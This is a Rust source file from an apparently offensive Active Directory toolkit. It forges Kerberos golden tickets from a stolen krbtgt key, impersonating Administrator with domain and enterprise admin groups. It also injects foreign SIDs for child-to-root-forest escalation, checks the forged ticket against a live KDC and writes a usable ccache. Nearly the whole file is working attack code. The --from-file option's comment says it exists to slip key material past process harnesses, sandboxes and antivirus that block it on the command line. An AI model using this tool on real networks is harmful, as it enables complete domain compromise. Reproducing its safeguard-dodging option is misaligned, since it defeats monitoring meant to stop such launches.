//! Golden ticket: forge a TGT for any identity with the krbtgt AES256 key.
//! Sealed + double-signed so fully-patched (KB5020805) KDCs still accept it.

use crate::ui;
use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct GoldenArgs {
    /// Read every argument from an INI-style KEY=VALUE file instead of the
    /// command line. Useful in environments where the caller's process
    /// harness rejects command-line launches that carry raw key material in
    /// argv (some sandboxes / AV pattern-match on `--krbtgt-aes256 <hex>`).
    /// Keys: `kdc`, `realm`, `krbtgt_aes256`, `rc4`, `domain_sid` (one per
    /// line; lines starting with `#` are comments). `env:VAR` / `@file:PATH`
    /// still work for `krbtgt_aes256`.
    #[arg(long, value_name = "PATH")]
    pub from_file: Option<String>,
    /// KDC host or IP.
    #[arg(long)]
    pub kdc: Option<String>,
    /// Kerberos realm (e.g. CORP.LOCAL).
    #[arg(long)]
    pub realm: Option<String>,
    /// krbtgt key: AES256 (64 hex) by default, or the RC4/NT hash (32 hex) with --rc4.
    #[arg(long)]
    pub krbtgt_aes256: Option<adhammer_core::SecretString>,
    /// Forge an RC4-HMAC (etype 23) ticket — interpret the key as the krbtgt NT hash (legacy DCs).
    #[arg(long)]
    pub rc4: bool,
    /// Domain SID (S-1-5-21-a-b-c).
    #[arg(long)]
    pub domain_sid: Option<String>,
    /// Identity to impersonate (default Administrator).
    #[arg(long, default_value = "Administrator")]
    pub user: String,
    /// RID of the impersonated account (default 500).
    #[arg(long, default_value_t = 500)]
    pub rid: u32,
    /// Group RIDs to embed (default: Users + Domain/Schema/Enterprise Admins + GPO Creators).
    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
    pub groups: Vec<u32>,
    /// Write the forged TGT to this ccache path.
    #[arg(long)]
    pub out: Option<String>,
    /// Optional live acceptance proof: request a service ticket for this SPN with the forged TGT.
    #[arg(long)]
    pub verify_spn: Option<String>,
    /// **1.4.8-A WS-SID-HISTORY-INJECT.** Foreign-forest / cross-domain SID(s) to inject
    /// into the PAC's `ExtraSids` field (KERB_VALIDATION_INFO.SidCount, MS-PAC §2.5).
    /// This is the SID-history-injection attack: from a compromised child domain, forge
    /// a Golden ticket that carries the ROOT-domain Enterprise Admins SID
    /// (`S-1-5-21-<root-forest>-519`) as an ExtraSid. On a trusting forest with SID
    /// filtering disabled — or a same-forest child-domain trust where SIDHistory is not
    /// filtered by default — the KDC authorizes the forged principal AS the injected
    /// group without needing the trusting forest's krbtgt key.
    ///
    /// Repeat `--foreign-sid` or comma-separate for multiple. Format: full
    /// `S-1-5-21-...-RID`. Only identifier authority 5 (NT_AUTHORITY) accepted —
    /// ExtraSids is a domain/forest-SID-only field.
    ///
    /// Canonical example (child → root Enterprise Admins):
    ///   `adhammer attack golden --realm CHILD.CORP.LOCAL --krbtgt-aes256 <hex>
    ///    --domain-sid S-1-5-21-1-2-3 --user Administrator --rid 500
    ///    --foreign-sid S-1-5-21-10-20-30-519 --out ea.ccache`
    #[arg(long, value_delimiter = ',')]
    pub foreign_sid: Vec<String>,
}

/// Golden ticket: forge a TGT for an arbitrary identity, sealed + double-signed with the domain's
/// krbtgt AES256 key. Accepted by fully-patched (KB5020805) KDCs because the forged PAC carries a
/// valid KDC signature plus PAC_REQUESTOR/PAC_ATTRIBUTES.
///
/// Wraps `golden_impl` with a per-stage checklist so the run-end card breaks the operation into
/// distinct phases (key parse → SID parse → foreign SID parse → forge → verify → write ccache).
pub(crate) async fn golden(a: GoldenArgs) -> Result<()> {
    let cfg = match a.from_file.as_deref() {
        Some(p) => load_golden_ini(p)?.overlay(&a)?,
        None => GoldenConfig::from_flags(&a)?,
    };
    let mut checklist = ui::StageChecklist::new([
        "parse krbtgt key",
        "parse domain SID",
        "parse foreign SIDs (ExtraSids)",
        "forge golden TGT",
        "verify with KDC (--verify-spn)",
        "write ccache",
    ]);
    let result = golden_impl(cfg, &mut checklist).await;
    match &result {
        Ok(()) => checklist.render("Golden stages"),
        Err(e) => {
            let brief = format!("{e:#}")
                .lines()
                .next()
                .unwrap_or("failed")
                .chars()
                .take(80)
                .collect::<String>();
            checklist.mark_current_failed(brief);
            checklist.render("Golden stages (failed)");
        }
    }
    result
}

async fn golden_impl(cfg: GoldenConfig, checklist: &mut ui::StageChecklist) -> Result<()> {
    use adhammer_kerberos::pac::ForgeIdentity;

    let key = crate::parse_forge_key(cfg.krbtgt_aes256.expose_secret(), cfg.rc4)?;
    checklist.record_ok(
        "parse krbtgt key",
        if cfg.rc4 {
            "RC4-HMAC (NT hash)"
        } else {
            "AES256-CTS-HMAC-SHA1-96"
        },
    );
    let subs: Vec<u32> = cfg
        .domain_sid
        .trim_start_matches("S-1-5-")
        .split('-')
        .map(|x| x.parse::<u32>())
        .collect::<std::result::Result<_, _>>()
        .context("--domain-sid must be S-1-5-21-a-b-c")?;
    checklist.record_ok("parse domain SID", format!("→ {}", cfg.domain_sid));

    // Parse --foreign-sid values into sub-authority chains for the PAC's ExtraSids.
    // Only identifier authority 5 (NT_AUTHORITY) is meaningful in KERB_VALIDATION_INFO
    // ExtraSids — anything else is nonsense in an AD trust context.
    let mut extras: Vec<Vec<u32>> = Vec::with_capacity(cfg.foreign_sid.len());
    for sid_str in &cfg.foreign_sid {
        let sid = adhammer_core::sid::Sid::parse(sid_str).ok_or_else(|| {
            anyhow::anyhow!("--foreign-sid {sid_str:?} is not a valid SID (want S-1-5-21-...-RID)")
        })?;
        if sid.identifier_authority != 5 {
            anyhow::bail!(
                "--foreign-sid {sid_str} has identifier authority {} != 5; ExtraSids only \
                 accepts NT_AUTHORITY (S-1-5-...) forest/domain SIDs",
                sid.identifier_authority
            );
        }
        extras.push(sid.sub_authorities.clone());
    }

    let id = ForgeIdentity {
        user: cfg.user.clone(),
        rid: cfg.rid,
        primary_gid: 513,
        group_rids: cfg.groups.clone(),
        domain_subauths: subs,
        logon_server: cfg.realm.split('.').next().unwrap_or("DC").to_uppercase(),
        logon_domain: cfg.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
        extra_sids: extras,
    };
    if !cfg.foreign_sid.is_empty() {
        println!(
            "[+] injecting {} foreign SID(s) into PAC ExtraSids:",
            cfg.foreign_sid.len()
        );
        for s in &cfg.foreign_sid {
            println!("    {s}");
        }
        checklist.record_ok(
            "parse foreign SIDs (ExtraSids)",
            format!("{} SID(s) injected", cfg.foreign_sid.len()),
        );
    } else {
        checklist.record_ok("parse foreign SIDs (ExtraSids)", "none");
    }
    let tgt = adhammer_kerberos::forge_golden_tgt(&id, &cfg.realm, &key, cfg.rc4)?;
    checklist.record_ok(
        "forge golden TGT",
        format!("{}@{} (rid {})", cfg.user, cfg.realm, cfg.rid),
    );
    println!(
        "[+] forged golden TGT: {}@{} (rid {}, groups {:?})",
        cfg.user, cfg.realm, cfg.rid, cfg.groups
    );

    if let Some(spn) = &cfg.verify_spn {
        match adhammer_kerberos::roast_spn(&tgt, &cfg.user, spn, &cfg.kdc).await {
            Ok(_) => {
                checklist.record_ok(
                    "verify with KDC (--verify-spn)",
                    format!("KDC accepted for {spn}"),
                );
                println!("[+] KDC accepted the golden ticket (TGS-REP for {spn})");
            }
            Err(e) => {
                checklist.record_ok(
                    "verify with KDC (--verify-spn)",
                    format!("KDC rejected for {spn}: {e}"),
                );
                println!("[-] KDC rejected the golden ticket for {spn}: {e}");
            }
        }
    } else {
        checklist.record_ok(
            "verify with KDC (--verify-spn)",
            "skipped (no --verify-spn)",
        );
    }
    if let Some(out) = &cfg.out {
        let cc = adhammer_kerberos::golden_ccache(&tgt, &cfg.user)?;
        adhammer_core::write_secret_artifact(
            std::path::Path::new(out),
            adhammer_core::SecretArtifact::Ccache,
            &cc,
        )?;
        checklist.record_ok("write ccache", format!("→ {out} ({} bytes)", cc.len()));
        println!(
            "[+] wrote ccache → {out} ({} bytes). Use: KRB5CCNAME={out}",
            cc.len()
        );
    } else {
        checklist.record_ok("write ccache", "skipped (no --out)");
    }
    Ok(())
}

#[derive(Debug)]
struct GoldenConfig {
    kdc: String,
    realm: String,
    krbtgt_aes256: adhammer_core::SecretString,
    rc4: bool,
    domain_sid: String,
    user: String,
    rid: u32,
    groups: Vec<u32>,
    out: Option<String>,
    verify_spn: Option<String>,
    foreign_sid: Vec<String>,
}

impl GoldenConfig {
    fn from_flags(a: &GoldenArgs) -> Result<Self> {
        let krbtgt_aes256 = match &a.krbtgt_aes256 {
            Some(k) => crate::resolve_secret(k, "ADHAMMER_PASSWORD")?,
            None => anyhow::bail!("--krbtgt-aes256 required (or use --from-file)"),
        };
        Ok(Self {
            kdc: a
                .kdc
                .clone()
                .ok_or_else(|| anyhow::anyhow!("--kdc required (or use --from-file)"))?,
            realm: a
                .realm
                .clone()
                .ok_or_else(|| anyhow::anyhow!("--realm required (or use --from-file)"))?,
            krbtgt_aes256,
            rc4: a.rc4,
            domain_sid: a
                .domain_sid
                .clone()
                .ok_or_else(|| anyhow::anyhow!("--domain-sid required (or use --from-file)"))?,
            user: a.user.clone(),
            rid: a.rid,
            groups: a.groups.clone(),
            out: a.out.clone(),
            verify_spn: a.verify_spn.clone(),
            foreign_sid: a.foreign_sid.clone(),
        })
    }
}

#[derive(Debug)]
struct GoldenFile {
    kdc: Option<String>,
    realm: Option<String>,
    krbtgt_aes256: Option<String>,
    rc4: Option<bool>,
    domain_sid: Option<String>,
}

impl GoldenFile {
    fn overlay(self, a: &GoldenArgs) -> Result<GoldenConfig> {
        let take =
            |from_file: Option<String>, from_flag: Option<String>, name: &str| -> Result<String> {
                from_flag.or(from_file).ok_or_else(|| {
                    anyhow::anyhow!("{name} missing in both --from-file and CLI flags")
                })
            };
        let key_raw = a
            .krbtgt_aes256
            .as_ref()
            .map(|s| s.expose_secret().to_string())
            .or(self.krbtgt_aes256)
            .ok_or_else(|| anyhow::anyhow!("krbtgt_aes256 missing in both --from-file and CLI flags"))?;
        let krbtgt_aes256 = crate::resolve_secret(key_raw.as_str(), "ADHAMMER_PASSWORD")?;
        Ok(GoldenConfig {
            kdc: take(self.kdc, a.kdc.clone(), "kdc")?,
            realm: take(self.realm, a.realm.clone(), "realm")?,
            krbtgt_aes256,
            rc4: a.rc4 || self.rc4.unwrap_or(false),
            domain_sid: take(self.domain_sid, a.domain_sid.clone(), "domain_sid")?,
            user: a.user.clone(),
            rid: a.rid,
            groups: a.groups.clone(),
            out: a.out.clone(),
            verify_spn: a.verify_spn.clone(),
            foreign_sid: a.foreign_sid.clone(),
        })
    }
}

fn load_golden_ini(path: &str) -> Result<GoldenFile> {
    use anyhow::Context;
    let text = std::fs::read_to_string(path).with_context(|| format!("read --from-file {path}"))?;
    let mut f = GoldenFile {
        kdc: None,
        realm: None,
        krbtgt_aes256: None,
        rc4: None,
        domain_sid: None,
    };
    for (n, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        let (k, v) = line
            .split_once('=')
            .ok_or_else(|| anyhow::anyhow!("{path}:{}: expected KEY=VALUE", n + 1))?;
        let v = v.trim().to_string();
        match k.trim() {
            "kdc" => f.kdc = Some(v),
            "realm" => f.realm = Some(v),
            "krbtgt_aes256" => f.krbtgt_aes256 = Some(v),
            "rc4" => {
                f.rc4 = Some(v.parse::<bool>().map_err(|_| {
                    anyhow::anyhow!("{path}:{}: rc4 must be true|false", n + 1)
                })?);
            }
            "domain_sid" => f.domain_sid = Some(v),
            other => anyhow::bail!("{path}:{}: unknown key `{other}`", n + 1),
        }
    }
    Ok(f)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp_ini(name: &str, body: &str) -> String {
        let dir = std::env::temp_dir();
        let path = dir.join(format!(
            "adhammer_golden_{}_{}_{}.ini",
            name,
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_nanos())
                .unwrap_or(0)
        ));
        std::fs::write(&path, body).unwrap();
        path.to_string_lossy().into_owned()
    }

    fn empty_args() -> GoldenArgs {
        GoldenArgs {
            from_file: None,
            kdc: None,
            realm: None,
            krbtgt_aes256: None,
            rc4: false,
            domain_sid: None,
            user: "Administrator".to_string(),
            rid: 500,
            groups: vec![513, 512, 520, 518, 519],
            out: None,
            verify_spn: None,
            foreign_sid: Vec::new(),
        }
    }

    #[test]
    fn ini_parses_valid_keys() {
        let path = tmp_ini(
            "valid",
            "# a comment\n\
             kdc=dc.corp.local\n\
             realm=CORP.LOCAL\n\
             krbtgt_aes256=deadbeef\n\
             rc4=true\n\
             domain_sid=S-1-5-21-1-2-3\n",
        );
        let f = load_golden_ini(&path).unwrap();
        assert_eq!(f.kdc.as_deref(), Some("dc.corp.local"));
        assert_eq!(f.realm.as_deref(), Some("CORP.LOCAL"));
        assert_eq!(f.krbtgt_aes256.as_deref(), Some("deadbeef"));
        assert_eq!(f.rc4, Some(true));
        assert_eq!(f.domain_sid.as_deref(), Some("S-1-5-21-1-2-3"));
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn ini_unknown_key_errors() {
        let path = tmp_ini("unknown", "kdc=x\nbogus_key=1\n");
        let err = load_golden_ini(&path).unwrap_err().to_string();
        assert!(err.contains("unknown key"), "err was {err:?}");
        assert!(err.contains("bogus_key"), "err was {err:?}");
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn cli_flag_beats_ini_value() {
        let path = tmp_ini(
            "beat",
            "kdc=ini-kdc\n\
             realm=INI.LOCAL\n\
             krbtgt_aes256=aa\n\
             domain_sid=S-1-5-21-9-9-9\n",
        );
        let f = load_golden_ini(&path).unwrap();
        let mut a = empty_args();
        a.kdc = Some("cli-kdc".to_string());
        let cfg = f.overlay(&a).unwrap();
        assert_eq!(cfg.kdc, "cli-kdc");
        assert_eq!(cfg.realm, "INI.LOCAL");
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn missing_required_key_errors() {
        let path = tmp_ini(
            "missing",
            "# no kdc line here\n\
             realm=CORP.LOCAL\n\
             krbtgt_aes256=aa\n\
             domain_sid=S-1-5-21-1-2-3\n",
        );
        let f = load_golden_ini(&path).unwrap();
        let a = empty_args();
        let err = f.overlay(&a).unwrap_err().to_string();
        assert!(err.contains("kdc"), "err was {err:?}");
        let _ = std::fs::remove_file(&path);
    }
}
